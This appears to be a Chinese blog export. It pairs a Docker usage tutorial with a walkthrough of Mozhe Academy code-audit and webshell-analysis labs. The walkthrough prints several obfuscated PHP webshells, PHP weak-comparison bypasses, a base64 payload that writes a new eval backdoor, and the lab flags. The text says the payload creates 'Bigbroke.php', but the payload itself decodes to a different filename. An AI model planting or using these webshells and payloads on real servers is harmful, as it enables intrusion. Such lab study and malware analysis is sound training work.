id="attach-命令"><a href="#attach-命令" class="headerlink" title="attach 命令"></a><code>attach</code> 命令</h4><p><code>docker attach</code> 是 Docker 自带的命令。下面示例如何使用该命令。</p><pre><code class="bash">$ docker run -dit ubuntu243c32535da7d142fb0e6df616a3c3ada0b8ab417937c853a9e1c251f499f550$ docker container lsCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES243c32535da7        ubuntu:latest       &quot;/bin/bash&quot;         18 seconds ago      Up 17 seconds                           nostalgic_hypatia$ docker attach 243croot@243c32535da7:/#</code></pre><p><em>注意：</em> 如果从这个 stdin 中 exit，会导致容器的停止。</p><h4 id="exec-命令"><a href="#exec-命令" class="headerlink" title="exec 命令"></a><code>exec</code> 命令</h4><p>-i -t 参数</p><p><code>docker exec</code> 后边可以跟多个参数，这里主要说明 <code>-i</code> <code>-t</code> 参数。</p><p>只用 <code>-i</code> 参数时，由于没有分配伪终端，界面没有我们熟悉的 Linux 命令提示符，但命令执行结果仍然可以返回。</p><p>当 <code>-i</code> <code>-t</code> 参数一起使用时，则可以看到我们熟悉的 Linux 命令提示符。</p><pre><code class="bash">$ docker run -dit ubuntu69d137adef7a8a689cbcb059e94da5489d3cddd240ff675c640c8d96e84fe1f6$ docker container lsCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES69d137adef7a        ubuntu:latest       &quot;/bin/bash&quot;         18 seconds ago      Up 17 seconds                           zealous_swirles$ docker exec -i 69d1 bash</code></pre><h3 id="2-4导出容器"><a href="#2-4导出容器" class="headerlink" title="2.4导出容器"></a>2.4导出容器</h3><p>如果要导出本地某个容器，可以使用 <code>docker export</code> 命令。</p><pre><code class="bash">$ docker container ls -aCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                    PORTS               NAMES7691a814370e        ubuntu:14.04        &quot;/bin/bash&quot;         36 hours ago        Exited (0) 21 hours ago                       test$ docker export 7691a814370e &gt; ubuntu.tar</code></pre><p>这样将导出容器快照到本地文件。</p><h3 id="2-5导入容器快照"><a href="#2-5导入容器快照" class="headerlink" title="2.5导入容器快照"></a>2.5导入容器快照</h3><p>可以使用 <code>docker import</code> 从容器快照文件中再导入为镜像，例如</p><pre><code class="bash">$ cat ubuntu.tar | docker import - test/ubuntu:v1.0$ docker image lsREPOSITORY          TAG                 IMAGE ID            CREATED              VIRTUAL SIZEtest/ubuntu         v1.0                9d37a6082e97        About a minute ago   171.3 MB</code></pre><h3 id="2-6删除容器"><a href="#2-6删除容器" class="headerlink" title="2.6删除容器"></a>2.6删除容器</h3><p>可以使用 <code>docker container rm</code> 来删除一个处于终止状态的容器。例如</p><pre><code class="bash">$ docker container rm id</code></pre><p>如果要删除一个运行中的容器，可以添加 <code>-f</code> 参数。Docker 会发送 <code>SIGKILL</code> 信号给容器。</p><h2 id="0x03-dockerfile"><a href="#0x03-dockerfile" class="headerlink" title="0x03 dockerfile"></a>0x03 dockerfile</h2><h3 id="编写Dockerfile"><a href="#编写Dockerfile" class="headerlink" title="编写Dockerfile"></a>编写Dockerfile</h3><pre><code>FROM node:8.4：该 image 文件继承官方的 node image，冒号表示标签，这里标签是8.4，即8.4版本的 node。COPY .[directory]：将当前目录下的所有文件（除了.dockerignore排除的路径），都拷贝进入 image 文件的 directory 目录。WORKDIR [directory]：指定接下来的工作路径为 directory。RUN [cmd]：在/app目录下，运行[cmd]命令安装依赖。注意，安装后所有的依赖，都将打包进入 image 文件。EXPOSE [port]：将容器 port 端口暴露出来， 允许外部连接这个端口。CMD [cmd]：在容器启动后自动执行 [cmd] 命令</code></pre><blockquote><pre><code class="bash">FROM node:8.4COPY . /appWORKDIR /appRUN npm install --registry=https://registry.npm.taobao.orgEXPOSE 3000</code></pre></blockquote><p>上面代码一共五行，含义如下。</p><blockquote><ul><li><code>FROM node:8.4</code>：该 image 文件继承官方的 node image，冒号表示标签，这里标签是<code>8.4</code>，即8.4版本的 node。</li><li><code>COPY . /app</code>：将当前目录下的所有文件（除了<code>.dockerignore</code>排除的路径），都拷贝进入 image 文件的<code>/app</code>目录。</li><li><code>WORKDIR /app</code>：指定接下来的工作路径为<code>/app</code>。</li><li><code>RUN npm install</code>：在<code>/app</code>目录下，运行<code>npm install</code>命令安装依赖。注意，安装后所有的依赖，都将打包进入 image 文件。</li><li><code>EXPOSE 3000</code>：将容器 3000 端口暴露出来， 允许外部连接这个端口。</li></ul></blockquote><h3 id="创建image文件"><a href="#创建image文件" class="headerlink" title="创建image文件"></a>创建image文件</h3><pre><code> docker image build -t myctf .docker build - &lt; Dockerfile</code></pre><p><code>-t</code>用来指定 image 文件的名字，后面还可用冒号指定标签，如果不指定，则默认为<code>latest</code>，</p><h3 id="生成容器"><a href="#生成容器" class="headerlink" title="生成容器"></a>生成容器</h3><p><code>docker container run</code> 命令会从 image 文件生成容器。</p><pre><code class="shell"> docker container run -p [port_local本地端口]:[port_container容器端口] -it image_name /bin/bash  docker container run -p 8000:3000 -it koa-demo /bin/bash   这就是在容器离得3000端口映射到本地8000端口 访问本机的8000端口就可以查看</code></pre><h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>cd 到dockerfile存在的文件下</p><p> sudo docker build -t phplfi:v1 .</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809301726_839.png" alt=""></p><p> sudo docker images</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809301726_49.png" alt=""></p><p>sudo docker run -d -p 2333:80 phplfi:v1</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809301727_684.png" alt=""></p><p>sudo docker run -it phplfi /bin/bash</p><h2 id="0x04-容器文件"><a href="#0x04-容器文件" class="headerlink" title="0x04 容器文件"></a>0x04 容器文件</h2><p>image 文件生成的容器实例，本身也是一个文件，称为容器文件。</p><pre><code># 列出本机正在运行的容器$ docker container ls# 列出本机所有容器，包括终止运行的容器$ docker container ls --all# 移除不需要的容器文件$ docker container rm [containerID]# 容器中止后自动删除容器文件$ docker container run --rm -p 8000:3000 -it image-file /bin/bash</code></pre><h2 id="0x05-网络配置"><a href="#0x05-网络配置" class="headerlink" title="0x05 网络配置"></a>0x05 网络配置</h2><h3 id="5-1映射容器端口到宿主主机的实现"><a href="#5-1映射容器端口到宿主主机的实现" class="headerlink" title="5.1映射容器端口到宿主主机的实现"></a>5.1映射容器端口到宿主主机的实现</h3><p>容器允许外部访问，可以在 <code>docker run</code> 时候通过 <code>-p</code> 或 <code>-P</code> 参数来启用。</p><p>docker run -it –name dedefun -p 0.0.0.0:8080:80 dedefun:latest /bin/bash</p><p>自动分配一个端口</p><p>docker run -it –name dedefun -p 0.0.0.0::8080 dedefun:latest /bin/bash</p><h2 id="0x06-docker命令补齐"><a href="#0x06-docker命令补齐" class="headerlink" title="0x06 docker命令补齐"></a>0x06 docker命令补齐</h2><p>执行<code>source xxx</code>命令，先执行<code>source /usr/share/bash-completion/completions/docker</code>，再输入<code>docker</code>，然后按2次Tab键，提示错误如下：</p><pre><code class="bash">docker bash: _get_comp_words_by_ref: command not foundbash: [: : integer expression expectedbash: [: : integer expression expectedbash: [: : integer expression expectedbash: _get_comp_words_by_ref: command not foundbash: [: : integer expression expectedbash: [: : integer expression expectedbash: [: : integer expression expected</code></pre><p>注：第一行的docker，实际是输入的命令，其它是按Tab键的输出信息。</p><p>前面已经安装了<code>bash_completion</code>，于是想到执行</p><pre><code>source /usr/share/bash-completion/bash_completion</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809301547_621.png" alt=""></p><h2 id="0x06-复现柠檬牛ctf"><a href="#0x06-复现柠檬牛ctf" class="headerlink" title="0x06 复现柠檬牛ctf"></a>0x06 复现柠檬牛ctf</h2><p>git clone <a href="https://github.com/l3m0n/My_CTF_Challenges.git" target="_blank" rel="external">https://github.com/l3m0n/My_CTF_Challenges.git</a></p><p>cd My_CTF_Challenges </p><p>cd </p><p>docker build -t dedefun ./</p><p>docker run -it –name dedefun -p 0.0.0.0:8080:80 dedefun:latest /bin/bash</p><p>curl 127.0.0.1</p><p>cd  var/www/html </p><p>发现只有index.html  就运行下start.sh</p><p>./start.sh</p><p>退出 exit或者 ctrl +d</p><pre><code class="bash"> docker image ls</code></pre><p>终止状态的容器可以用 <code>docker container ls -a</code> 命令看到</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808202019_416.png" alt=""></p><h2 id="好文：Docker容器的创建、启动、和停止"><a href="#好文：Docker容器的创建、启动、和停止" class="headerlink" title="好文：Docker容器的创建、启动、和停止"></a>好文：<a href="https://www.cnblogs.com/linjiqin/p/8608975.html" target="_blank" rel="external">Docker容器的创建、启动、和停止</a></h2><p>1、容器是独立运行的一个或一组应用，及他们的运行环境。容器是Docker中的一个重要的概念。</p><p><strong>2、docker容器的启动有三种方式</strong><br>a.交互方式，基于镜像新建容器并启动<br>例如我们可以启动一个容器，打印出当前的日历表<br>[root@rocketmq-nameserver4 ~]# docker run my/python:v1 cal ##my/python:v1为镜像名和标签<br><img src="https://images2018.cnblogs.com/blog/270324/201803/270324-20180320141006656-1163681357.png" alt="img"></p><p>我们还可以通过指定参数，启动一个bash交互终端。<br>[root@rocketmq-nameserver4 ~]# docker run -it my/python:v1 /bin/bash<br><img src="https://images2018.cnblogs.com/blog/270324/201803/270324-20180320141018576-2113140501.png" alt="img"><br>参数-t让Docker分配一个伪终端并绑定在容器的标准输入上，-i让容器的标准输入保持打开。</p><p>使用docker run命令来启动容器，docker在后台运行的标准操作包括<br>1.检查本地是否存在指定的镜像，不存在则从公有仓库下载<br>2.使用镜像创建并启动容器<br>3.分配一个文件系统，并在只读的镜像层外面挂载一层可读可写层<br>4.从宿主主机配置的网桥接口中桥接一个虚拟接口道容器中去<br>5.从地址池分配一个ip地址给容器<br>6.执行用户指定的应用程序<br>7.执行完毕之后容器被终止<br><img src="https://images2018.cnblogs.com/blog/270324/201803/270324-20180320141029918-349771940.png" alt="img"><br>my/sinatra:v2基于training/sinatra镜像进行修改后的镜像，training/sinatra为公有仓库上的镜像。</p><p>b、短暂方式，直接将一个已经终止的容器启动运行起来<br>可以使用docker start命令，直接将一个已经终止的容器启动运行起来。</p><p>[root@rocketmq-nameserver4 ~]# docker run my/python:v1 /bin/echo hello test<br>hello test<br>命令执行完，控制台会打印”hello test”，container就终止了，不过并没有消失，<br>可以用”docker ps -n 5 “看一下最新前5个的container，第一个就是刚刚执行过的container，可以再次执行一遍：docker start container_id</p><p>不过这次控制台看不到”hello test”了，只能看到ID，用logs命令才能看得到：docker logs container_id。<br>可以看到两个”hello test”了，因为这个container运行了两次。<br><img src="https://images2018.cnblogs.com/blog/270324/201803/270324-20180320141043102-2077108773.png" alt="img"></p><p>c、daemon方式，守护态运行<br>即让软件作为长时间服务运行，这就是SAAS啊！</p><p>例如我们启动centos后台容器，每隔一秒打印当天的日历。<br>$ docker run -d centos /bin/sh -c “while true;do echo hello docker;sleep 1;done”</p><p>启动之后，我们使用docker ps -n 5查看容器的信息</p><p>要查看启动的centos容器中的输出，可以使用如下方式：<br>$ docker logs $CONTAINER_ID ##在container外面查看它的输出<br>$ docker attach $CONTAINER_ID ##连接上容器实时查看：</p><p><strong>3、终止容器</strong><br>使用docker stop $CONTAINER_ID来终止一个运行中的容器。并且可以使用docker ps -a来看终止状态的容器。<br><img src="https://images2018.cnblogs.com/blog/270324/201803/270324-20180320141055377-965119728.png" alt="img"></p><p>终止状态的容器，可以使用docker start来重新启动。<br><img src="https://images2018.cnblogs.com/blog/270324/201803/270324-20180320141106848-1725632174.png" alt="img"></p><p>使用docker restart命令来重启一个容器。<br><img src="https://images2018.cnblogs.com/blog/270324/201803/270324-20180320141119426-840453652.png" alt="img"></p><p>invalid argument “Mysqlonline” for t: Error parsing reference: “Mysqlonline” is not a valid repository/tag: repository name must be lowercase See ‘docker build –help’.</p><p>原因真正原因是名称中带了大写的M O，将大写改为小写，创建成功。</p><p>坑啊，文档中并没有哪里要求只能是小写。</p><p>docker run -it –name mysqlonline -p 0.0.0.0:8080:80  mysqlonline:latest /bin/bash</p><p>sudo apt install curl</p><p>xftp<br>  202  ls<br>  203  cd geekweb1/<br>  204  clear<br>  205  ls<br>  206  pwd<br>  207  docker build -t tset/img /root/geekweb1<br>  208  docker images<br>  209  docker rmi c8daa6cadc73<br>  210  doker stop 036d7eabaf2e<br>  211  docker 036d7eabaf2e<br>  212  docker stop 036d7eabaf2e<br>  213  docker rm 036d7eabaf2e<br>  214  docker rmi c8daa6cadc73<br>  215  lsa<br>  216  cd ..<br>  217  ls<br>  218  rm -rf geekweb1</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>墨者学院审计类通关指南</title>
      <link href="/archis/441c37c9/"/>
      <url>/archis/441c37c9/</url>
      
        <content type="html"><![CDATA[<p>文章首发于<a href="https://xz.aliyun.com/t/2821" target="_blank" rel="external">先知社区</a>,转载请注明来源</p><h2 id="一、PHP代码分析溯源"><a href="#一、PHP代码分析溯源" class="headerlink" title="一、PHP代码分析溯源"></a>一、PHP代码分析溯源</h2><h3 id="0x00-第1题"><a href="#0x00-第1题" class="headerlink" title="0x00 第1题"></a>0x00 第1题</h3><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>某日，在某公司做IT维护的朋友给安全工程师”墨者”发了一个PHP文件，说在其WEB服务器发现多了一个b.php文件，目前不确定这个文件是开发留下的正常文件还是攻击者上传的木马后门，希望”墨者”能够帮他分析一下。 </p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>访问<a href="http://219.153.49.228:42335/" target="_blank" rel="external">http://219.153.49.228:42335/</a></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809291012_99.png" alt=""></p><pre><code class="php">&lt;?php @$_++;$__=(&quot;`&quot;^&quot;?&quot;).(&quot;:&quot;^&quot;}&quot;).(&quot;%&quot;^&quot;`&quot;).(&quot;{&quot;^&quot;/&quot;);$___=(&quot;$&quot;^&quot;{&quot;).(&quot;~&quot;^&quot;.&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;-&quot;^&quot;~&quot;).(&quot;(&quot;^&quot;|&quot;);${$__}[!$_](${$___}[$_]); ?&gt;</code></pre><p>分析代码：</p><p>我们用echo分别输出三个变量</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809291020_69.png" alt=""></p><p><code>&quot;$_&quot;     &quot;$__&quot;     &quot;$___&quot;</code> 这三个是变量名，我们通过编译知道它们分别是：</p><p>$_ =&gt; 1</p><p>$__ =&gt; _GET</p><p>$___ =&gt; _POST</p><p>实际上去理解“^”为异或运算符，$<em>++;这行代码的意思是对变量名为”</em>“的变量进行自增操作，可以发现是异曲同工之妙</p><pre><code>$__=(&quot;`&quot;^&quot;?&quot;).(&quot;:&quot;^&quot;}&quot;).(&quot;%&quot;^&quot;`&quot;).(&quot;{&quot;^&quot;/&quot;);(&quot;`&quot;^&quot;?&quot;)       01100000^00111111=01011111 —&gt;”_”(&quot;:&quot;^&quot;}&quot;)        00111010^01111101=01000111—&gt;”G”(&quot;%&quot;^&quot;`&quot;)      00100101^01100000=01000101—&gt;”E”(&quot;{&quot;^&quot;/&quot;)        01111011^ 00101111=01010100—&gt;”T”</code></pre><p>我们把变量用值替换进去得到</p><p> <code>${_GET}[!1](${_POST}[1]);</code>，把多余的{}去掉 [!1]也就是[0]</p><p>整理后代码如下： <code>$_GET[0]($_POST[1]);</code>和一句话的 <code>$_POST[1]</code>传参差不多了，那么<code>$_GET[0]</code>就是我们的函数名了</p><p>根据”b.php源码”提示去b.php目录下</p><p>用hackbar传GET和POST请求</p><p><a href="http://219.153.49.228:42335/b.php?0=assert" target="_blank" rel="external">http://219.153.49.228:42335/b.php?0=assert</a></p><p>1=phpinfo()</p><p>可以执行</p><p>菜刀写入<a href="http://219.153.49.228:42335/b.php?0=assert密码是1" target="_blank" rel="external">http://219.153.49.228:42335/b.php?0=assert密码是1</a></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809291026_279.png" alt=""></p><p>mozheae74b8ee177abe3a37432f933ac</p><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>这里有一个问题在于</p><p><a href="http://219.153.49.228:42335/b.php?0=eval" target="_blank" rel="external">http://219.153.49.228:42335/b.php?0=eval</a></p><p>无法显示phpinfo</p><p>这里延伸出一个问题<a href="https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html" target="_blank" rel="external">柠檬大大的文章</a>解释的很好</p><p>问题出在</p><p><code>$_POST[&#39;1&#39;]()</code>这是一个<a href="http://php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="external">可变函数</a>,这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括<strong>回调函数</strong>，函数表在内的一些用途。 </p><p>但是eval不能被可变函数 调用。 </p><blockquote><p><a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed" target="_blank" rel="external">mixed</a> <strong>eval</strong> ( string <code>$code</code> ) </p><p><strong>Note</strong>: 因为是一个语言构造器而不是一个函数，不能被 <a href="http://php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="external">可变函数</a> 调用。 </p></blockquote><h3 id="0x01-第二题"><a href="#0x01-第二题" class="headerlink" title="0x01 第二题"></a>0x01 第二题</h3><h4 id="背景-1"><a href="#背景-1" class="headerlink" title="背景"></a>背景</h4><p>根据提供的源代码，分析找出认证码，审计源代码，需要找一个值，这个值的md5值在php中==题中给定值的md5值</p><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809290917_642.png" alt=""></p><p>下载源代码，审计</p><pre><code class="php">&lt;?phperror_reporting(0);$a1 = md5(&#39;QNKCDZO&#39;);$a = @$_POST[&#39;pass&#39;];$a2 = @md5($a);if(isset($a)){    if ($a != &#39;QNKCDZO&#39; &amp;&amp; $a1 == $a2) {        /**        内容省略！         **/        exit();    } else {        echo &#39;&lt;script&gt;alert(\&#39;认证错误\&#39;);window.location.href=\&#39;/index.html\&#39;;&lt;/script&gt;&#39;;    }}?&gt;</code></pre><p>这里有很明显的问题，密码是以MD5方式保存，只要找到一个QNKCDZO的md5值相同的密码就可以通过，或者php是弱类型语言，在使用 == 号时，如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行</p><pre><code>md5(&#39;240610708&#39;) 的结果是：0e462097431906509019562988736854md5(&#39;QNKCDZO&#39;) 的结果是：0e830400451993494058024219903391</code></pre><p> 0e 的科学记数法开头，字符串被隐式转换为浮点数，实际上也就等效于 0，所以为0，相等。</p><p>输入240610708</p><p>KEY:<br>mozhe454234355b0307eea24ed161701</p><h3 id="0x02-第三题"><a href="#0x02-第三题" class="headerlink" title="0x02 第三题"></a>0x02 第三题</h3><h4 id="背景-2"><a href="#背景-2" class="headerlink" title="背景"></a>背景</h4><p>某公司雇佣你对一个登陆界面进行测试，你只能得到源码，需要审计这段源码，找出其漏洞并成功登陆</p><h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809290930_375.png" alt=""></p><p>下载源代码，审计</p><pre><code class="php">&lt;?phperror_reporting(0); function noother_says_correct($number) {     $one = ord(&#39;1&#39;);     $nine = ord(&#39;9&#39;);     for ($i = 0; $i &lt; strlen($number); $i++)     {         $digit = ord($number{$i});         if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )         {             return false;         }     }     return $number == &#39;54975581388&#39;; }if(noother_says_correct($_POST[&#39;pass&#39;])){    /**    此处省略     **/} else{    echo &#39;&lt;script&gt;alert(\&#39;认证错误\&#39;);window.location.href=\&#39;/index.html\&#39;;&lt;/script&gt;&#39;;}?&gt;</code></pre><p>分析代码：</p><p>1.在for 循环中是判断输入的字符是否有存在在1和9之间的数字</p><p>2.如果不存在判断是否等于54975581388</p><p>3.等于就可以绕过</p><p>4..php弱类型考点<code>$a == $b</code>等于<strong>TRUE</strong> 如果类型转换后<code>$a</code>等于<code>$b</code>，php在转码时会把16进制转化为十进制，将54975581388转成16进制，0xccccccccc。</p><p>KEY: mozhe8466fa038dd9ad4c4934892d6b7</p><h2 id="二、WebShell代码分析溯源全解析"><a href="#二、WebShell代码分析溯源全解析" class="headerlink" title="二、WebShell代码分析溯源全解析"></a>二、WebShell代码分析溯源全解析</h2><h3 id="0x00-第一题"><a href="#0x00-第一题" class="headerlink" title="0x00 第一题"></a>0x00 第一题</h3><h4 id="背景-3"><a href="#背景-3" class="headerlink" title="背景"></a>背景</h4><p>某系统环境上发现一个可疑文件，请协助运维人员分析此文件的功能。</p><h4 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809271427_84.png" alt=""></p><p> 下载系统源码 ，发现在cn-right.php文件中存在webshell</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809271435_300.png" alt=""></p><pre><code class="php">&lt;?phperror_reporting(0);$_GET[&#39;POST&#39;]($_POST[&#39;GET&#39;]);?&gt;</code></pre><p>这里分析一下webshell代码，用GET和POST函数就构成了木马，</p><p>方法一：</p><p><a href="http://219.153.49.228:40568/www/cn-right.php?POST=assert" target="_blank" rel="external">http://219.153.49.228:40568/www/cn-right.php?POST=assert</a></p><p>GET=${fputs(fopen(base64_decode(bWFuZzAucGhw),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUWydtYW5nMCddKTsgPz4=))}</p><p>执行后当前目录生成Bigbroke.php一句话木马，密码为 Bigbroke</p><p>方法二：</p><p>客户端用菜刀，密码GET，url为<a href="http://219.153.49.228:40568/www/cn-right.php?POST=assert" target="_blank" rel="external">http://219.153.49.228:40568/www/cn-right.php?POST=assert</a></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809291005_963.png" alt=""></p><p>mozhe3dbde397de25960e10f5d997a47</p><h3 id="0x01-第二题-1"><a href="#0x01-第二题-1" class="headerlink" title="0x01 第二题"></a>0x01 第二题</h3><h4 id="背景-4"><a href="#背景-4" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281233_867.png" alt=""></p><p>下载系统源码，在index.php存在恶意代码</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281248_425.png" alt=""></p><pre><code class="php">&lt;?php     $POST[&#39;POST&#39;]=&#39;assert&#39;;    $array[]=$POST;    $array[0][&#39;POST&#39;]($_POST[&#39;assert&#39;]);?&gt;</code></pre><p>这里分析一下webshell代码：</p><p>assert，是php代码执行函数，与eval()有同样的功能，因为<code>$array[],POST[]</code>都是数组，所以<code>$array[]=$POST</code>，就是把<code>$POST</code>数组的值赋给<code>$array</code>数组，这样的话<code>$array[0][&#39;POST&#39;]</code>的输出就是assert，所以组成了一句话木马<code>&lt;?php assert($_POST[&#39;assert&#39;]);?&gt;</code>直接用菜刀链接即可密码为assert。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281310_877.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281310_426.png" alt=""></p><p>mozheb1315766f73e9fe22e58b67c107</p><h3 id="0x02-第三题-1"><a href="#0x02-第三题-1" class="headerlink" title="0x02 第三题"></a>0x02 第三题</h3><h4 id="背景-5"><a href="#背景-5" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281620_62.png" alt=""></p><p>下载系统源码，</p><pre><code class="php">查看所有php后缀文件$ag -g . --phpindex.php js/jquery1.42.min.php includes/class-IXR-clientmulticall.php includes/class-IXR-date.php includes/class-IXR-client.php includes/class-IXR-base64.php</code></pre><p>在jquery1.42.min.php存在恶意代码</p><p>D盾查杀也找到对应的文件。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281617_574.png" alt=""></p><pre><code class="php">&lt;?phperror_reporting(0);$g = array(&#39;&#39;,&#39;s&#39;);$gg = a.$g[1].ser.chr(&#39;116&#39;);@$gg($_POST[get]);?&gt;</code></pre><p>这里分析一下webshell代码：</p><p>php中“.”表示将前后单位以字符串形式拼接</p><p>数组g[1]=s, char(116)是t ，gg连起来就是assert</p><p>整个一句话为<code>@$assert($_POST(get))</code></p><p><a href="http://219.153.49.228:47270/www/js/jquery1.42.min.php" target="_blank" rel="external">http://219.153.49.228:47270/www/js/jquery1.42.min.php</a>  密码get</p><p>中国菜刀连接</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281629_99.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281629_506.png" alt=""></p><p>mozhebfb0dc9d53ee0aea51d557142fe</p><h3 id="0x03-第四题"><a href="#0x03-第四题" class="headerlink" title="0x03 第四题"></a>0x03 第四题</h3><h4 id="背景-6"><a href="#背景-6" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h4><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281638_331.png" alt=""></p><p> 下载系统源码，在index.php存在恶意代码</p><pre><code class="php">&lt;?phperror_reporting(0);$e=$_REQUEST[&#39;e&#39;];$arr=array($_POST[&#39;POST&#39;],);array_filter($arr,base64_decode($e));?&gt;</code></pre><p>这里分析一下webshell代码：</p><p>1、发现使用回调函数，各函数解释如下：<br>    ①、<code>$_REQUEST[]</code>,HTTP Request 变量,默认情况下包含了 <code>$_GET，$_POST 和 $_COOKIE</code> 的数组。<br>    ②、array_filter()回调函数,原型为：</p><p><code>array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )</code></p><pre><code>       依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。③base64_decode(),对 base64 编码的 data 进行解码。返回原始数据， 或者在失败时返回 FALSE。返回的数据可能是二进制的。</code></pre><p>2、整理后，最终shell代码为</p><p><code>base64_decode($_REQUEST[&#39;e&#39;])(​$_POST[&#39;POST&#39;]);</code></p><p>3、构造assert函数，使用$e参数传递经过base64编码后的assert字符串</p><p><a href="http://219.153.49.228:48776/www/hack/bin.php?e=YXNzZXJ0" target="_blank" rel="external">http://219.153.49.228:48776/www/hack/bin.php?e=YXNzZXJ0</a> 密码POST</p><p>YXNzZXJ0用base64解码的结果是assert  </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281704_36.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281711_538.png" alt=""></p><p>mozhe29055fb55f5c3cae9d29040f187</p><h3 id="0x04-第五题"><a href="#0x04-第五题" class="headerlink" title="0x04 第五题"></a>0x04 第五题</h3><h4 id="背景-7"><a href="#背景-7" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281724_18.png" alt=""></p><p> 下载系统源码，在Exception.php存在恶意代码</p><p>D盾扫描验证</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281733_804.png" alt=""></p><pre><code class="php">error_reporting(0);call_user_func(&#39;assert&#39;, $_REQUEST[&#39;assert&#39;]);</code></pre><p>这里分析一下webshell代码：</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281727_700.png" alt=""></p><p>整理后shell代码为：assert($_REQUEST[‘assert’]);</p><p><a href="http://http://219.153.49.228:47037/www/Exception.php密码assert" target="_blank" rel="external">http://http://219.153.49.228:47037/www/Exception.php密码assert</a></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281729_410.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281731_794.png" alt=""></p><p>mozhed6b28482c826171d5761e39f628</p><h3 id="0x05-第六题"><a href="#0x05-第六题" class="headerlink" title="0x05 第六题"></a>0x05 第六题</h3><h4 id="背景-8"><a href="#背景-8" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281737_575.png" alt=""></p><p> 下载系统源码，在index.php存在恶意代码</p><p>D盾扫描验证</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281738_988.png" 